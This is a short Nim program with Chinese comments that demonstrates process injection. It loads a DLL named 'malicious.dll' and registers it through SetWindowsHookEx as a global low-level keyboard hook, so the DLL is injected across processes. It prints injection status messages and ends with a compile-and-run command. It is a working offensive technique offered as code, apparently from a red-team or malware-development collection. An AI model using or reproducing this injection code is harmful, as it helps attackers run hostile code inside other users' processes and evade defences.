import winim/lean

# 回调函数，CallNextHookEx表示将当前钩子传递给钩子链中的下一个钩子
proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} = 
  return CallNextHookEx(0, nCode, wParam, lParam)

proc setWindowsHookExInj(dllPath: string): void =
  echo "[*] Injecting: ", dllPath
  let myDll = LoadLibraryA(dllPath)

  # 第三个参数指的是指向钩子过程的dll句柄（事实上，这个dll是我们控制的，未必要让它正常运行），第四个参数为0指钩子过程与系统中所有线程相关联
  var hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookCallback, myDll, 0)
  echo "[+] Successfully inject in the process! "
  Sleep(4000)
  UnhookWindowsHookEx(hookHandle)   # 卸载钩子

when isMainModule:
  var file = "C:/users/user/desktop/malicious.dll"
  setWindowsHookExInj(file)

# nim c -r proc_inj_sethook.nim